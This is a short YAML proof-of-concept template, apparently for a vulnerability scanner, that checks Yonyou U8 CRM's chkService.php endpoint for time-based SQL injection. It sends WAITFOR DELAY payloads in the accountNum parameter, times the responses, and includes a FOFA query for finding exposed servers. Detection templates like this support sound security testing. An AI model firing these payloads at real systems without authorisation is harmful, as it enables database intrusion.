id: poc-yaml-yongyou-u8-crm-chkservice-sqli
info:
  name: 用友U8 CRM chkService.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友U8+CRM
  fofa: title="用友U8CRM"
variables:
  t1: random_int(6,9)
  t2: t1 + 2
  t3: random_int(1,4)
  t4: t3 + 2
requests:
- method: GET
  path: /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:{{.t1}}%27--
  headers:
    Cookie: PHPSESSID=bgsesstimeout-;
  expression: 'status_code == 200 &&

    duration >= t1 &&

    duration <= t2 &&

    contains(find_json(body,"success"), "true") &&

    contains(find_json(body,"code"), "") &&

    contains(find_json(body,"message"), "")

    '
- method: GET
  path: /ajax/chkService.php?Action=chkAccountNumExists&accountNum=1%27;WAITFOR+DELAY+%270:0:{{.t3}}%27--
  headers:
    Cookie: PHPSESSID=bgsesstimeout-;
  expression: 'status_code == 200 &&

    duration >= t3 &&

    duration <= t4 &&

    contains(find_json(body,"success"), "true") &&

    contains(find_json(body,"code"), "") &&

    contains(find_json(body,"message"), "")

    '
transport: http
